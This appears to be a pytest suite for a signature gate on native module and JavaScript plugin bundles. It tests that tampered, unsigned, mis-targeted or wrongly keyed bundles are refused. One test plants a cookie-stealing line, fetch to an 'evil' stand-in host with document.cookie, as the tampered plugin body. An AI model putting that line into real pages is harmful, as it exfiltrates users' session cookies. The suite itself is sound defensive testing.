# Copyright (c) 2024-2026 Bryan Everly
# Licensed under the GNU Affero General Public License v3.0 (AGPL-3.0).
# See the LICENSE file in the project root for the full terms.

"""Authenticity gate for Pro+ module bundles.

These are adversarial by design: the thing being protected is native code
``dlopen``-ed into the server process, so each test states an attack and
asserts it is REFUSED.  The happy path is one test; the rest are the point.

The gate replaced an ``X-Content-SHA512`` response-header check that (a) took
its expected digest from the same response as the payload, (b) skipped
verification entirely when the header was absent, and (c) never ran at all on
the cache path.
"""

import base64
import hashlib
import json

import pytest
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from backend.licensing import module_signature as ms


def _raw_public(key: Ed25519PrivateKey) -> bytes:
    return key.public_key().public_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw,
    )


PLATFORM = {"platform": "linux", "architecture": "x86_64", "python_version": "abi3"}
SO_NAME = "demo_engine.abi3.so"
MO_REL = "locales/de/LC_MESSAGES/demo_engine.mo"


def _canonical_manifest(files: dict, **identity) -> bytes:
    """Byte-for-byte what the Pro+ signer produces (sorted, tight separators).

    Duplicated here rather than imported: the Pro+ repo is proprietary and not
    importable from these tests, and a verifier test that shares code with its
    signer proves less than one that re-derives the format.
    """
    manifest = {
        "schema": 1,
        **identity,
        "files": dict(sorted(files.items())),
    }
    return json.dumps(
        manifest, sort_keys=True, separators=(",", ":"), ensure_ascii=True
    ).encode("utf-8")


@pytest.fixture
def signed_module(tmp_path, monkeypatch):
    """A signed module directory plus the key that signed it."""
    key = Ed25519PrivateKey.generate()
    monkeypatch.setattr(
        ms, "_TRUSTED_KEYS", [base64.b64encode(_raw_public(key)).decode("ascii")]
    )

    module_dir = tmp_path / "demo_engine_abi3"
    (module_dir / "locales" / "de" / "LC_MESSAGES").mkdir(parents=True)
    (module_dir / SO_NAME).write_bytes(b"\x7fELF fake compiled engine")
    (module_dir / "metadata.json").write_text('{"version":"1.2.3"}', encoding="utf-8")
    (module_dir / MO_REL).write_bytes(b"fake catalog")

    files = {
        rel: hashlib.sha256((module_dir / rel).read_bytes()).hexdigest()
        for rel in (SO_NAME, "metadata.json", MO_REL)
    }
    manifest = _canonical_manifest(
        files,
        module_code="demo_engine",
        version="1.2.3",
        platform="linux",
        architecture="x86_64",
        python_version="abi3",
    )
    (module_dir / ms.MANIFEST_NAME).write_bytes(manifest)
    (module_dir / ms.SIGNATURE_NAME).write_bytes(base64.b64encode(key.sign(manifest)))
    return module_dir


def _verify(module_dir, code="demo_engine", platform_info=None):
    ms.verify_module_dir(
        str(module_dir), code, str(module_dir / SO_NAME), platform_info or PLATFORM
    )


def test_genuine_bundle_verifies(signed_module):
    _verify(signed_module)  # must not raise


def test_tampered_so_is_refused(signed_module):
    (signed_module / SO_NAME).write_bytes(b"\x7fELF malicious payload")
    with pytest.raises(ms.ModuleSignatureError, match="does not match"):
        _verify(signed_module)


def test_tampered_gettext_catalog_is_refused(signed_module):
    """The .mo is read by the engine, so it is signed too -- verifying only the
    .so would leave a file the module itself parses unprotected."""
    (signed_module / MO_REL).write_bytes(b"malicious catalog")
    with pytest.raises(ms.ModuleSignatureError, match="does not match"):
        _verify(signed_module)


def test_missing_signature_is_refused(signed_module):
    """The old check was fail-OPEN: no header meant no verification.  Absence
    must now be a refusal, or omitting the signature is the whole attack."""
    (signed_module / ms.SIGNATURE_NAME).unlink()
    with pytest.raises(ms.ModuleSignatureError, match="unsigned module"):
        _verify(signed_module)


def test_missing_manifest_is_refused(signed_module):
    (signed_module / ms.MANIFEST_NAME).unlink()
    with pytest.raises(ms.ModuleSignatureError, match="unsigned module"):
        _verify(signed_module)


def test_manifest_rewritten_to_match_tampered_so_is_refused(signed_module):
    """Recomputing the digest is exactly what an attacker with write access
    would do; it fails on the signature, which they cannot forge."""
    evil = b"\x7fELF malicious payload"
    (signed_module / SO_NAME).write_bytes(evil)
    manifest = json.loads((signed_module / ms.MANIFEST_NAME).read_text())
    manifest["files"][SO_NAME] = hashlib.sha256(evil).hexdigest()
    (signed_module / ms.MANIFEST_NAME).write_bytes(
        json.dumps(manifest, sort_keys=True, separators=(",", ":")).encode()
    )
    with pytest.raises(ms.ModuleSignatureError, match="signature does not verify"):
        _verify(signed_module)


def test_signed_bundle_for_another_engine_is_refused(signed_module):
    """Content signing alone would let a genuinely-signed engine be served in
    place of a different one; identity is signed too."""
    with pytest.raises(ms.ModuleSignatureError, match="not 'other_engine'"):
        _verify(signed_module, code="other_engine")


@pytest.mark.parametrize(
    "field,value", [("platform", "windows"), ("architecture", "aarch64")]
)
def test_wrong_platform_identity_is_refused(signed_module, field, value):
    with pytest.raises(ms.ModuleSignatureError, match=field):
        _verify(signed_module, platform_info={**PLATFORM, field: value})


def test_abi3_bundle_loads_on_any_python(signed_module):
    """Engines build ONCE under the limited API and are stored as ``abi3``,
    while the loader reports the running interpreter ("3.14").  A plain
    equality check here rejected every genuine bundle -- a total Pro+ outage
    dressed as a security fix.  abi3 must satisfy any supported CPython."""
    _verify(signed_module, platform_info={**PLATFORM, "python_version": "3.14"})
    _verify(signed_module, platform_info={**PLATFORM, "python_version": "3.10"})


def test_non_abi3_python_version_must_match(signed_module, monkeypatch):
    """The relaxation is scoped to abi3 only: a bundle pinned to one
    interpreter must not load on another."""
    manifest = json.loads((signed_module / ms.MANIFEST_NAME).read_bytes())
    files = manifest["files"]
    key = Ed25519PrivateKey.generate()
    monkeypatch.setattr(
        ms, "_TRUSTED_KEYS", [base64.b64encode(_raw_public(key)).decode("ascii")]
    )
    pinned = _canonical_manifest(
        files,
        module_code="demo_engine",
        version="1.2.3",
        platform="linux",
        architecture="x86_64",
        python_version="cp313",
    )
    (signed_module / ms.MANIFEST_NAME).write_bytes(pinned)
    (signed_module / ms.SIGNATURE_NAME).write_bytes(base64.b64encode(key.sign(pinned)))
    with pytest.raises(ms.ModuleSignatureError, match="python_version"):
        _verify(signed_module, platform_info={**PLATFORM, "python_version": "3.14"})


def test_unlisted_file_in_module_dir_is_refused(signed_module):
    """Every manifest entry can verify while an EXTRA .so sits beside them.
    Nothing loads it on today's path, but "the manifest describes this
    directory" has to mean the whole directory."""
    (signed_module / "a_evil.abi3.so").write_bytes(b"\x7fELF")
    with pytest.raises(ms.ModuleSignatureError, match="does not cover"):
        _verify(signed_module)


def test_deleted_manifest_file_is_refused(signed_module):
    (signed_module / "metadata.json").unlink()
    with pytest.raises(ms.ModuleSignatureError, match="which is missing"):
        _verify(signed_module)


def test_no_trusted_key_refuses_everything(signed_module, monkeypatch):
    """A build shipped without its trust anchor must load nothing, rather than
    fall back to accepting whatever it is handed."""
    monkeypatch.setattr(ms, "_TRUSTED_KEYS", [])
    with pytest.raises(ms.ModuleSignatureError, match="no usable module signing key"):
        _verify(signed_module)


def test_signature_from_a_different_key_is_refused(signed_module, monkeypatch):
    """The negative control for the whole scheme: a perfectly-formed signature
    over the real manifest, made by a key we do not trust."""
    impostor = Ed25519PrivateKey.generate()
    manifest = (signed_module / ms.MANIFEST_NAME).read_bytes()
    (signed_module / ms.SIGNATURE_NAME).write_bytes(
        base64.b64encode(impostor.sign(manifest))
    )
    with pytest.raises(ms.ModuleSignatureError, match="signature does not verify"):
        _verify(signed_module)


def test_key_rotation_overlap_accepts_either_key(signed_module, monkeypatch):
    """Rotation ships two anchors for one release; a bundle signed by either
    must load, or the rotation itself is an outage."""
    other = Ed25519PrivateKey.generate()
    monkeypatch.setattr(
        ms,
        "_TRUSTED_KEYS",
        [base64.b64encode(_raw_public(other)).decode("ascii"), *ms._TRUSTED_KEYS],
    )
    _verify(signed_module)  # signed by the second anchor, must not raise


def test_malformed_trust_anchor_does_not_disable_a_good_one(signed_module, monkeypatch):
    """One unusable entry must not take the working key down with it."""
    monkeypatch.setattr(ms, "_TRUSTED_KEYS", ["not-valid-base64!!", *ms._TRUSTED_KEYS])
    _verify(signed_module)


# --------------------------------------------------------------------------
# Plugin bundles: a bare .js executed in an authenticated admin's browser, so
# a substituted one is script execution in that session.  Same fail-open
# X-Content-SHA512 header, plus a cache path that checked only that the file
# EXISTED -- so anything able to write it once was served forever after.
# --------------------------------------------------------------------------


def _sign_plugin(path, key, module_code="demo_engine", version="1.2.3"):
    """Write a signed plugin bundle, mirroring the Pro+ signer's format."""
    body = path.read_bytes()
    manifest = json.dumps(
        {
            "schema": 1,
            "module_code": module_code,
            "version": version,
            "sha256": hashlib.sha256(body).hexdigest(),
        },
        sort_keys=True,
        separators=(",", ":"),
        ensure_ascii=True,
    )
    envelope = {
        "manifest": manifest,
        "sig": base64.b64encode(key.sign(manifest.encode("utf-8"))).decode("ascii"),
    }
    trailer = base64.b64encode(
        json.dumps(envelope, sort_keys=True, separators=(",", ":")).encode("utf-8")
    )
    path.write_bytes(body + b"\n" + ms.PLUGIN_SIG_PREFIX.encode() + trailer + b"\n")


@pytest.fixture
def signed_plugin(tmp_path, monkeypatch):
    key = Ed25519PrivateKey.generate()
    monkeypatch.setattr(
        ms, "_TRUSTED_KEYS", [base64.b64encode(_raw_public(key)).decode("ascii")]
    )
    path = tmp_path / "demo_engine-plugin.iife.js"
    path.write_bytes(b'console.log("real plugin");\n')
    _sign_plugin(path, key)
    return path


def test_genuine_plugin_verifies(signed_plugin):
    ms.verify_plugin_bundle(str(signed_plugin), "demo_engine")


def test_plugin_with_injected_script_is_refused(signed_plugin):
    raw = signed_plugin.read_bytes()
    signed_plugin.write_bytes(
        raw.replace(
            b'console.log("real plugin");', b'fetch("//evil/"+document.cookie);'
        )
    )
    with pytest.raises(ms.ModuleSignatureError, match="does not match"):
        ms.verify_plugin_bundle(str(signed_plugin), "demo_engine")


def test_plugin_without_signature_trailer_is_refused(signed_plugin):
    body = signed_plugin.read_bytes().split(b"\n" + ms.PLUGIN_SIG_PREFIX.encode())[0]
    signed_plugin.write_bytes(body + b"\n")
    with pytest.raises(ms.ModuleSignatureError, match="unsigned plugin bundle"):
        ms.verify_plugin_bundle(str(signed_plugin), "demo_engine")


def test_plugin_signed_for_another_engine_is_refused(signed_plugin):
    with pytest.raises(ms.ModuleSignatureError, match="not 'other_engine'"):
        ms.verify_plugin_bundle(str(signed_plugin), "other_engine")


def test_plugin_with_garbage_trailer_is_refused(signed_plugin):
    body = signed_plugin.read_bytes().split(b"\n" + ms.PLUGIN_SIG_PREFIX.encode())[0]
    signed_plugin.write_bytes(
        body + b"\n" + ms.PLUGIN_SIG_PREFIX.encode() + b"bm90LWEtc2ln\n"
    )
    with pytest.raises(ms.ModuleSignatureError, match="malformed plugin signature"):
        ms.verify_plugin_bundle(str(signed_plugin), "demo_engine")


def test_plugin_signature_from_untrusted_key_is_refused(signed_plugin, monkeypatch):
    impostor = Ed25519PrivateKey.generate()
    body = signed_plugin.read_bytes().split(b"\n" + ms.PLUGIN_SIG_PREFIX.encode())[0]
    signed_plugin.write_bytes(body)
    _sign_plugin(signed_plugin, impostor)
    with pytest.raises(ms.ModuleSignatureError, match="signature does not verify"):
        ms.verify_plugin_bundle(str(signed_plugin), "demo_engine")


def test_manifest_paths_compare_as_posix_on_windows(signed_module, monkeypatch):
    """Manifest keys are tar arcnames, which always use "/".  ``os.path.relpath``
    yields "\\" on Windows, so the unlisted-file sweep compared "locales\\de\\..."
    against "locales/de/..." and REFUSED every bundle carrying a gettext
    catalog -- i.e. most engines, on every Windows server.  Linux never saw it
    because the two forms coincide there.

    Simulating the separator is the only way to catch this from a POSIX CI leg.
    """
    import ntpath

    monkeypatch.setattr(ms.os, "sep", "\\")
    monkeypatch.setattr(ms.os.path, "relpath", ntpath.relpath)
    _verify(signed_module)  # must not raise


def test_windows_separators_still_reject_an_unlisted_file(signed_module, monkeypatch):
    """The POSIX normalisation must not become a way to smuggle a file in."""
    import ntpath

    (signed_module / "locales" / "de" / "LC_MESSAGES" / "extra.mo").write_bytes(b"x")
    monkeypatch.setattr(ms.os, "sep", "\\")
    monkeypatch.setattr(ms.os.path, "relpath", ntpath.relpath)
    with pytest.raises(ms.ModuleSignatureError, match="does not cover"):
        _verify(signed_module)
